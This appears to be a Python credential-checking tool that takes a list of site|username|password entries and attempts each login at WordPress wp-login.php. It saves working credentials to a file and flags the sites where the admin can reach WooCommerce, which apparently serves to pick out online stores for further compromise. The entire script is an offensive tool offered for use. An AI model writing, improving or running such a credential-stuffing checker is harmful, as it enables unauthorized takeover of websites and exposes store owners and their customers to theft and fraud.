import requests
import requests, random, string, re, time, urllib.parse
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from colorama import *
from time import strftime
import os,sys
init(autoreset=True)

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
def checkwo(url):
    try:
        go = requests.session()
        site, user, passwd = url.split("|")
        get = go.get(site, timeout=10)
        submit = re.findall(
            '<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*)" />',
            get.content)
        submit = submit[0]
        redirect = re.findall('<input type="hidden" name="redirect_to" value="(.*?)" />', get.content)
        redirect = redirect[0]
        Login = {'log': user,
                 'pwd': passwd,
                 'wp-submit': submit,
                 'redirect_to': redirect,
                 'testcookie': '1'}
        req = go.post(site, data=Login, timeout=20)
        currurl = site.replace("/wp-login.php", "")
        if 'dashboard' in req.content:
          print('Login Success! checking WooCommerce plugins...' + site)
          with open('loginsuccess.txt', 'a') as writer:
            writer.write("http://"+site+"/wp-login.php|"+user+"|"+passwd+"\n")
          ngecek = currurl + "/wp-admin/admin.php?page=wc-admin"
          getdata = go.get(ngecek, timeout=20, allow_redirects=False).content
          if 'WooCommerce' in getdata:
            print(fg+"[+] " + currurl + " >> WooCommerce installed"+fw)
            open('WooCommerce.txt', 'a').write(currurl + '/wp-login.php|'+user+'|'+passwd+'\n')
          else:
            print(fy+"[-] " + currurl + " >> WooCommerce not found"+fw)
        else:
          print(fy+"[-] " + currurl + " ==> Login failed"+fw)
    except:
      pass
    
lists = input('Enter Your Logins :')
with open(lists) as f:
  for url in f:
    checkwo(url)
